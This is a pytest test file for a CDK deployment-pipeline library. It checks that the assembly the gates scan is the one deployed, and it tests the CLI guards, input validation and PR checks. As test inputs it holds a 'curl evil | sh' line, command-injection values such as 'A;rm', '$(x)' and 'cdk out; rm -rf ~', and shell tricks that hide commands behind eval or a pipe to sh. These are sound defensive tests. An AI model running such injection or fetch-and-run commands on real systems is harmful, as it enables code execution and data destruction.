"""Build once: the assembly the gates inspect is the assembly that is deployed."""

import copy
import json
import shutil
import subprocess

import pytest
from aws_cdk import aws_iam as iam
from aws_cdk.assertions import Template
from test_pipeline import GATES, build

from specter_pipeline import Assembly, DeployStep, Gate, PostDeployStep, Runtime
from specter_pipeline import testing as c
from specter_pipeline.gate import SNAPSHOT_DIR, deploy_command, mentions_cdk_cli
from specter_pipeline.presets import (
    python_cdk_assembly,
    python_cdk_gates,
    scan_every_assembly,
)

REPO = "Specter099/demo"
SCAN = Gate("scan", ["ls cdk.out"], uses_assembly=True)
ASM_GATES = [*GATES, SCAN]
DEPLOY = DeployStep("app", stacks=["AppStack"])


def asm_build(**overrides) -> Template:
    kw = {
        "application_stage": None,
        "assembly": Assembly(install=["pip install -r requirements.txt"]),
        "deploy_step": DEPLOY,
        "gates": ASM_GATES,
    }
    kw.update(overrides)
    return build(**kw)


@pytest.fixture(scope="module")
def tpl() -> Template:
    return asm_build()


def actions(t: Template, stage: str) -> dict:
    return {a["Name"]: a for a in c._stage(t, stage)["Actions"]}


def inputs(action: dict) -> set[str]:
    return {i["Name"] for i in action.get("InputArtifacts", [])}


# --- the CDK CLI guard -------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        # every spelling and hiding place from both reviews
        "cdk deploy B", "cdk synth", "cdk diff A", "cdk ls", "cdk destroy A", "cdk watch",
        "npx aws-cdk deploy B", "npx cdk@2 deploy B", "/tmp/nodejs/bin/cdk deploy B",
        "$(npm bin)/cdk deploy B", "node node_modules/aws-cdk/bin/cdk deploy B",
        "bash -lc 'cdk deploy B'", "echo 'cdk deploy B' | sh", "eval cdk deploy B",
        "(cdk deploy B)", "{ cdk deploy B; }", "! cdk deploy B", "echo `cdk deploy B`",
        "if true; then cdk deploy B; fi", "for s in B C; do cdk deploy $s; done",
        "until cdk deploy B; do sleep 5; done", "timeout 600 cdk deploy B",
        "time -p cdk deploy B", "env -u X cdk deploy B", "poetry run cdk deploy B",
        "uv run cdk deploy B", "yarn cdk deploy B", "npm exec -- cdk deploy B",
        "true # comment\ncdk deploy B", "curl https://x/y#frag && cdk deploy B",
        "cdk --require-approval never deploy B", "npm install -g aws-cdk@2",
        "pip install x;cdk deploy B",
    ],
)
def test_the_cli_guard_sees_the_cdk_cli_anywhere(command):
    assert mentions_cdk_cli(command)


@pytest.mark.parametrize(
    "command",
    [
        "ls cdk.out", "cat cdk.json", "pip install aws-cdk-lib==2.170.0", "pip install cdk-nag",
        "python -m cdk_nag", "npm i cdk8s", "./scripts/pre-deploy.sh", "echo my-cdk-app",
        "pip install -r requirements.txt",
    ],
)
def test_the_cli_guard_ignores_files_and_libraries(command):
    assert not mentions_cdk_cli(command)


# --- step validation ---------------------------------------------------------------------------


def test_assembly_defaults():
    a = Assembly()
    assert (a.name, a.commands, a.runtime, a.output_dir, a.memory_gb) == (
        "Assemble",
        ["cdk synth"],
        Runtime.PYTHON_NODE,
        "cdk.out",
        4,
    )


def test_assembly_refuses_iam_permissions():
    stmt = iam.PolicyStatement(actions=["ssm:GetParameter"], resources=["arn:aws:ssm:::x"])
    with pytest.raises(ValueError, match="no IAM permissions"):
        Assembly(policy_statements=[stmt])


def test_assembly_needs_python_and_node():
    with pytest.raises(ValueError, match="PYTHON_NODE"):
        Assembly(runtime=Runtime.PYTHON)


@pytest.mark.parametrize("bad", ["/abs", "../up", "a/../b", "", "with space", ".", "./", "a/..", "--app", "-rf", ".hidden/.."])
def test_assembly_output_dir_must_be_relative(bad):
    with pytest.raises(ValueError, match="relative path"):
        Assembly(output_dir=bad)


@pytest.mark.parametrize("name", ["Gate-scan", "Deploy-app", "Post-x", "Approve-Deploy"])
def test_assembly_name_cannot_collide_with_pipeline_steps(name):
    with pytest.raises(ValueError, match="collides"):
        Assembly(name=name)


@pytest.mark.parametrize("cls", [Gate, DeployStep, PostDeployStep, Assembly])
def test_every_step_copies_its_lists(cls):
    commands, install = ["one"], ["pip install x"]
    step = cls(name="s", commands=commands, install=install)
    commands.append("two")
    install.append("curl evil | sh")
    assert step.commands == ["one"] and step.install == ["pip install x"]


@pytest.mark.parametrize("cls", [Gate, DeployStep, PostDeployStep])
def test_a_bare_string_is_not_a_command_list(cls):
    with pytest.raises(TypeError, match="lists of strings"):
        cls("s", "cdk deploy")


# --- pipeline validation -----------------------------------------------------------------------


def test_assembly_is_refused_with_an_application_stage():
    with pytest.raises(ValueError, match="already builds the assembly"):
        build(assembly=Assembly())


def test_a_gate_cannot_read_an_assembly_the_pipeline_does_not_build():
    with pytest.raises(ValueError, match="no assembly"):
        asm_build(assembly=None)


@pytest.mark.parametrize(
    "command",
    [
        "cdk deploy --app cdk.out AppStack",
        "cdk diff AppStack",
        "true # note\ncdk deploy B",
        "for s in A B; do cdk deploy --app cdk.out $s; done",
        "timeout 600 cdk synth",
    ],
)
def test_the_pipeline_refuses_the_cdk_cli_in_deploy_commands(command):
    with pytest.raises(ValueError, match="uses the CDK CLI"):
        asm_build(deploy_step=DeployStep("app", [command], stacks=["AppStack"]))


def test_install_commands_are_checked_too():
    with pytest.raises(ValueError, match="uses the CDK CLI"):
        asm_build(deploy_step=DeployStep("app", stacks=["AppStack"], install=["cdk synth"]))


def test_an_assembly_pipeline_needs_named_stacks():
    with pytest.raises(ValueError, match="name the stacks"):
        asm_build(deploy_step=DeployStep("app", ["./scripts/deploy.sh"]))


def test_stacks_need_an_assembly():
    with pytest.raises(ValueError, match="the pipeline has none"):
        build(application_stage=None, deploy_step=DEPLOY)


@pytest.mark.parametrize("arg", ["--app", "-a", "--build", "--output=x", "-o"])
def test_deploy_args_cannot_take_over_the_deploy(arg):
    with pytest.raises(ValueError, match="set by the construct"):
        DeployStep("app", stacks=["A"], deploy_args=[arg, "x"])


@pytest.mark.parametrize("stack", ["", "-rf", "A B", "A;rm", "$(x)"])
def test_stack_names_are_validated(stack):
    with pytest.raises(ValueError, match="invalid stack name"):
        DeployStep("app", stacks=[stack])


def test_without_stacks_a_deploy_step_still_needs_commands():
    with pytest.raises(ValueError, match="has no commands"):
        DeployStep("app")


def test_script_work_can_run_before_the_construct_deploy():
    t = asm_build(
        deploy_step=DeployStep("app", ["./scripts/pre-deploy.sh"], stacks=["AppStack"])
    )
    cmds = c.step_commands(t, "Deploy-app")
    assert cmds.index("./scripts/pre-deploy.sh") < len(cmds) - 1
    c.assert_standard_contract(t, repo=REPO, gates=ASM_GATES, node_gates=["synth-check", "lint"])


def test_the_deploy_snapshots_first_and_deploys_the_snapshot_last(tpl):
    cmds = c.step_commands(tpl, "Deploy-app")
    snap = next(i for i, x in enumerate(cmds) if x.startswith(f"rm -rf {SNAPSHOT_DIR}"))
    cli = next(i for i, x in enumerate(cmds) if "aws-cdk@" in x)
    assert snap < cli < cmds.index("pip install -r requirements.txt") if "pip install -r requirements.txt" in cmds else snap < cli
    assert "cp -R cdk.out/. /tmp/assembly/" in cmds[snap]
    assert cmds[-1] == "cdk deploy --app /tmp/assembly AppStack --require-approval never"
    assert cmds[-1] == deploy_command(["AppStack"], ["--require-approval", "never"])


@pytest.mark.parametrize("raw,norm", [("cdk.out/", "cdk.out"), ("./cdk.out", "cdk.out"), ("build/cdk.out", "build/cdk.out")])
def test_output_dir_is_stored_normalised_and_works_end_to_end(raw, norm):
    a = Assembly(output_dir=raw)
    assert a.output_dir == norm
    t = asm_build(assembly=a)
    assert norm in c.step_mounts(t, "Deploy-app").values()
    c.assert_builds_once(t, ASM_GATES)


# --- what it synthesizes -----------------------------------------------------------------------


def test_stage_order_is_unchanged(tpl):
    c.assert_stage_order(tpl)


def test_only_assembly_gates_wait_for_the_assembly(tpl):
    gates = actions(tpl, "Gates")
    first = gates["Assemble"]["RunOrder"]
    for g in GATES:
        assert gates[f"Gate-{g.name}"]["RunOrder"] == first, g.name
    assert gates["Gate-scan"]["RunOrder"] > first


def test_scan_gate_and_deploy_read_the_same_artifact(tpl):
    (out,) = actions(tpl, "Gates")["Assemble"]["OutputArtifacts"]
    assert out["Name"] in inputs(actions(tpl, "Gates")["Gate-scan"])
    assert out["Name"] in inputs(actions(tpl, "Deploy")["Deploy-app"])
    for g in GATES:
        assert out["Name"] not in inputs(actions(tpl, "Gates")[f"Gate-{g.name}"])
    assert c.step_mounts(tpl, "Deploy-app") == {out["Name"]: "cdk.out"}
    assert c.step_mounts(tpl, "Gate-scan") == {out["Name"]: "cdk.out"}


def test_assembly_step_installs_the_pinned_cli_then_synthesizes(tpl):
    cmds = c.step_commands(tpl, "Assemble")
    cli = next(i for i, x in enumerate(cmds) if x.startswith("npm install -g") and "aws-cdk@" in x)
    assert cmds.index("pip install -r requirements.txt") > cli
    assert cmds[-1] == "cdk synth"


def test_every_project_is_still_lambda_compute(tpl):
    c.assert_lambda_compute(tpl)
    c.assert_ci_env_on_repo_command_projects(tpl)


def test_approval_still_strictly_precedes_the_deploy(tpl):
    c.assert_deploy_ordering(tpl)
    c.assert_deploy_closed(tpl)


def test_contract_passes_and_includes_build_once(tpl):
    c.assert_standard_contract(tpl, repo=REPO, gates=ASM_GATES, node_gates=["synth-check", "lint"])


def test_contract_checks_build_once_whenever_there_is_an_assembly_step():
    """No gate reads the assembly, but the deploy still must: the contract notices the step."""
    doc = copy.deepcopy(asm_build(gates=GATES).to_json())
    _deploy_without_app(doc["Resources"])
    with pytest.raises(AssertionError, match="does not deploy the assembly snapshot"):
        c.assert_standard_contract(
            Template.from_json(doc), repo=REPO, gates=GATES, node_gates=["synth-check", "lint"]
        )


def test_stage_mode_gates_read_the_synth_output_that_is_deployed():
    t = build(gates=ASM_GATES)
    gates = actions(t, "Gates")
    assert "Assemble" not in gates
    assert "Synth_Output" in inputs(gates["Gate-scan"])
    c.assert_standard_contract(
        t, repo=REPO, gates=ASM_GATES, deploy_stage="Prod", node_gates=["synth-check", "lint"]
    )


# --- pull requests -----------------------------------------------------------------------------


def _pr(t: Template, gate: str) -> dict:
    (res,) = [
        r for r in c.pr_projects(t, "demo").values() if r["Properties"]["Name"] == f"demo-pr-{gate}"
    ]
    return res["Properties"]


def test_pr_check_for_an_assembly_gate_builds_the_assembly_first(tpl):
    props = _pr(tpl, "scan")
    cmds = json.loads(props["Source"]["BuildSpec"])["phases"]["build"]["commands"]
    assert any("node.tgz" in x for x in cmds), "needs Node to synthesize"
    assert cmds.index("cdk synth") < cmds.index("ls cdk.out")
    assert "python3.12" in props["Environment"]["Image"]


def test_pr_check_for_an_assembly_gate_gets_the_assembly_memory(tpl):
    assert _pr(tpl, "scan")["Environment"]["ComputeType"] == "BUILD_LAMBDA_4GB"
    t = asm_build(assembly=Assembly(memory_gb=10))
    assert _pr(t, "scan")["Environment"]["ComputeType"] == "BUILD_LAMBDA_10GB"
    assert _pr(t, "lint")["Environment"]["ComputeType"] == "BUILD_LAMBDA_2GB"


def test_stage_mode_pr_check_gets_the_synth_memory():
    t = build(gates=ASM_GATES, synth_memory_gb=8)
    assert _pr(t, "scan")["Environment"]["ComputeType"] == "BUILD_LAMBDA_8GB"


def test_pr_check_for_an_ordinary_gate_is_unchanged(tpl):
    cmds = json.loads(_pr(tpl, "lint")["Source"]["BuildSpec"])["phases"]["build"]["commands"]
    assert cmds == ["npm run lint"]


def test_pr_roles_stay_least_privilege(tpl):
    c.assert_pr_checks(tpl, ASM_GATES, "demo")
    c.assert_pr_roles_least_privilege(tpl, "demo")


def test_stage_mode_pr_check_reuses_the_synth_recipe():
    t = build(gates=ASM_GATES)
    cmds = json.loads(_pr(t, "scan")["Source"]["BuildSpec"])["phases"]["build"]["commands"]
    assert cmds.index("cdk -a 'python3 pipeline_app.py' synth") < cmds.index("ls cdk.out")


# --- presets -----------------------------------------------------------------------------------


def test_preset_assembly_mode_reads_the_shared_templates():
    gates = {g.name: g for g in python_cdk_gates(assembly=True)}
    synth = gates["cdk-synth"]
    assert synth.uses_assembly and synth.commands == ["test -f cdk.out/manifest.json"]
    assert synth.runs_on_pull_requests and not synth.policy_statements
    aa = gates["access-analyzer"]
    assert aa.uses_assembly and aa.runtime is Runtime.PYTHON
    assert not any("cdk synth" in x for x in aa.commands)
    assert not any("requirements.txt" in x or "aws-cdk@" in x for x in aa.install)
    assert any("find cdk.out -mindepth 1" in x for x in aa.commands)
    assert any('--template-dir "$dir"' in x for x in aa.commands)
    assert any("sha256sum -c" in x for x in aa.commands), "script must still be verified"
    assert not aa.runs_on_pull_requests


def test_preset_assembly_mode_still_synthesizes_every_pull_request():
    t = asm_build(assembly=python_cdk_assembly(), gates=python_cdk_gates(assembly=True))
    cmds = json.loads(_pr(t, "cdk-synth")["Source"]["BuildSpec"])["phases"]["build"]["commands"]
    assert cmds.index("cdk synth") < cmds.index("test -f cdk.out/manifest.json")


def test_preset_default_is_unchanged():
    gates = {g.name: g for g in python_cdk_gates()}
    assert "cdk-synth" in gates and not gates["access-analyzer"].uses_assembly
    assert gates["access-analyzer"].commands[0] == "cdk synth --quiet"


def test_preset_assembly_dir_reaches_every_command():
    gates = {g.name: g for g in python_cdk_gates(assembly=True, assembly_dir="build/cdk.out")}
    assert any("find build/cdk.out " in x for x in gates["access-analyzer"].commands)
    assert gates["cdk-synth"].commands == ["test -f build/cdk.out/manifest.json"]


def test_preset_template_dir_is_quoted():
    (aa,) = [g for g in python_cdk_gates(assembly=True, assembly_dir="cdk out; rm -rf ~")
             if g.name == "access-analyzer"]
    assert any("find 'cdk out; rm -rf ~' -mindepth 1" in x for x in aa.commands)


def _scan(tmp_path, layout, template_dir="cdk.out"):
    for rel in layout:
        f = tmp_path / rel
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text("{}")
    (tmp_path / "aa").mkdir(exist_ok=True)
    cmds = [x.replace("/tmp/aa", str(tmp_path / "aa"))
            for x in scan_every_assembly(template_dir, "echo SCAN")]
    return subprocess.run(["bash", "-ec", "\n".join(cmds)], check=False, cwd=tmp_path,
                          capture_output=True, text=True)


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
@pytest.mark.parametrize(
    "layout,ok,scanned",
    [
        (["cdk.out/manifest.json", "cdk.out/AppStack.template.json"], True, ["cdk.out"]),
        # an application_stage pipeline: pipeline stack on top, the application in its stage
        (["cdk.out/Pipe.template.json", "cdk.out/assembly-Prod/App.template.json"],
         True, ["cdk.out", "cdk.out/assembly-Prod"]),
        # an app with its own stages and no top-level stacks
        (["cdk.out/manifest.json", "cdk.out/assembly-Dev/A.template.json",
          "cdk.out/assembly-Prod/assembly-Prod-Inner/B.template.json"],
         True, ["cdk.out/assembly-Dev", "cdk.out/assembly-Prod/assembly-Prod-Inner"]),
        (["cdk.out/manifest.json"], False, []),
        ([], False, []),
    ],
)
def test_access_analyzer_scans_every_assembly_and_refuses_to_scan_nothing(tmp_path, layout, ok, scanned):
    result = _scan(tmp_path, layout)
    assert (result.returncode == 0) is ok, result.stdout + result.stderr
    got = [line.split("--template-dir ", 1)[1] for line in result.stdout.splitlines() if line.startswith("SCAN")]
    assert got == scanned
    if not ok:
        assert "no CloudFormation templates" in result.stdout


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
def test_a_failing_scan_fails_the_gate(tmp_path):
    for rel in ["cdk.out/A.template.json", "cdk.out/assembly-P/B.template.json"]:
        (tmp_path / rel).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / rel).write_text("{}")
    (tmp_path / "aa").mkdir()
    cmds = [x.replace("/tmp/aa", str(tmp_path / "aa")) for x in scan_every_assembly("cdk.out", "false")]
    r = subprocess.run(["bash", "-ec", "\n".join(cmds)], check=False, cwd=tmp_path, capture_output=True, text=True)
    assert r.returncode != 0


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
def test_the_scan_never_expands_the_directory_name(tmp_path):
    marker = tmp_path / "pwned"
    _scan(tmp_path, [], template_dir=f"$(touch {marker})")
    assert not marker.exists()


def test_preset_pipeline_in_assembly_mode_satisfies_the_contract():
    gates = python_cdk_gates(assembly=True, env={"X": "1"})
    t = asm_build(assembly=python_cdk_assembly(env={"X": "1"}), gates=gates)
    c.assert_standard_contract(t, repo=REPO, gates=gates, node_gates=["tests"])
    allowed = c.CDK_INTERNAL_WILDCARDS | {"access-analyzer:CheckNoPublicAccess"}
    c.assert_no_wildcard_resources(t, allowed_actions=allowed)


# --- the helper rejects each way of not building once ------------------------------------------


def mutated(change) -> Template:
    doc = copy.deepcopy(asm_build().to_json())
    change(doc["Resources"])
    return Template.from_json(doc)


def _stage_of(res, name):
    pipe = next(r for r in res.values() if r["Type"] == "AWS::CodePipeline::Pipeline")
    return next(s for s in pipe["Properties"]["Stages"] if s["Name"] == name)


def _action(res, stage, name):
    return next(a for a in _stage_of(res, stage)["Actions"] if a["Name"] == name)


def _project(res, step):
    return next(
        r["Properties"]
        for r in res.values()
        if r["Type"] == "AWS::CodeBuild::Project"
        and str(r["Properties"].get("Description", "")).endswith(f"/{step}")
    )


def _drop_assembly_input(action):
    action["InputArtifacts"] = action["InputArtifacts"][:1]


def _edit_deploy(res, edit):
    props = _project(res, "Deploy-app")
    spec = json.loads(props["Source"]["BuildSpec"])
    edit(spec["phases"]["build"]["commands"])
    props["Source"]["BuildSpec"] = json.dumps(spec)


def _deploy_without_app(res):
    _edit_deploy(res, lambda cmds: cmds.__setitem__(-1, "cdk deploy AppStack --require-approval never"))


def _second_cli_use(res):
    _edit_deploy(res, lambda cmds: cmds.insert(-1, "for s in B; do cdk deploy $s; done"))


def _no_snapshot(res):
    _edit_deploy(res, lambda cmds: [cmds.remove(x) for x in list(cmds) if SNAPSHOT_DIR in x and not x.startswith("cdk ")])


def _snapshot_after_repo_commands(res):
    def move(cmds):
        snap = [x for x in cmds if x.startswith(("test -f cdk.out/", f"rm -rf {SNAPSHOT_DIR}"))]
        for x in snap:
            cmds.remove(x)
        for x in snap:
            cmds.insert(-1, x)
    _edit_deploy(res, move)


def _deploy_with_build(res):
    _edit_deploy(res, lambda cmds: cmds.__setitem__(-1, cmds[-1] + " --build 'cdk synth'"))


def _deploy_without_mount(res):
    props = _project(res, "Deploy-app")
    spec = json.loads(props["Source"]["BuildSpec"])
    del spec["phases"]["install"]
    props["Source"]["BuildSpec"] = json.dumps(spec)


def _remove_assembly_step(res):
    st = _stage_of(res, "Gates")
    st["Actions"] = [a for a in st["Actions"] if a["Name"] != "Assemble"]


def _scan_in_parallel_with_assembly(res):
    _action(res, "Gates", "Gate-scan")["RunOrder"] = _action(res, "Gates", "Assemble")["RunOrder"]


@pytest.mark.parametrize(
    "change,message",
    [
        (lambda r: _drop_assembly_input(_action(r, "Deploy", "Deploy-app")), "does not read the assembly"),
        (_deploy_without_app, "does not deploy the assembly snapshot last"),
        (_second_cli_use, "uses the CDK CLI outside"),
        (_no_snapshot, "does not snapshot"),
        (_snapshot_after_repo_commands, "between its prelude and the assembly snapshot"),
        (_deploy_with_build, "overrides --app, --build or --output"),
        (_deploy_without_mount, "does not link"),
        (lambda r: _drop_assembly_input(_action(r, "Gates", "Gate-scan")), "does not read the deployed"),
        (_scan_in_parallel_with_assembly, "does not wait for the assembly"),
        (_remove_assembly_step, "no assembly step"),
    ],
)
def test_assert_builds_once_rejects(change, message):
    with pytest.raises(AssertionError, match=message):
        c.assert_builds_once(mutated(change), ASM_GATES)


def _stage_mutated(change) -> Template:
    doc = copy.deepcopy(build(gates=ASM_GATES).to_json())
    change(doc["Resources"])
    return Template.from_json(doc)


def _add_producer(res):
    extra = copy.deepcopy(_action(res, "Gates", "Gate-scan"))
    extra["Name"] = "Assemble"
    extra["OutputArtifacts"] = [{"Name": "Second_Output"}]
    _stage_of(res, "Gates")["Actions"].append(extra)


def _prepare_reads_other_artifact(res):
    for a in _stage_of(res, "Prod")["Actions"]:
        if a["ActionTypeId"]["Provider"] == "CloudFormation" and a.get("InputArtifacts"):
            a["InputArtifacts"] = [{"Name": "Other_Output"}]


@pytest.mark.parametrize(
    "change,message",
    [
        (lambda r: _drop_assembly_input(_action(r, "Gates", "Gate-scan")), "does not read the deployed"),
        (_add_producer, "must not build a second assembly"),
        (_prepare_reads_other_artifact, "does not read the deployed"),
    ],
)
def test_assert_builds_once_rejects_in_stage_mode(change, message):
    c.assert_builds_once(build(gates=ASM_GATES), ASM_GATES, "Prod")  # unmutated passes
    with pytest.raises(AssertionError, match=message):
        c.assert_builds_once(_stage_mutated(change), ASM_GATES, "Prod")


def test_assert_gates_present_rejects_an_unexpected_second_producer():
    def add(res):
        st = _stage_of(res, "Gates")
        extra = copy.deepcopy(_action(res, "Gates", "Assemble"))
        extra["Name"] = "Assemble2"
        st["Actions"].append(extra)

    with pytest.raises(AssertionError, match="more than one"):
        c.assert_gates_present(mutated(add), ASM_GATES)


def test_assert_gates_present_still_requires_parallel_gates():
    def stagger(res):
        _action(res, "Gates", "Gate-lint")["RunOrder"] = 5

    with pytest.raises(AssertionError, match="parallel"):
        c.assert_gates_present(mutated(stagger), ASM_GATES)
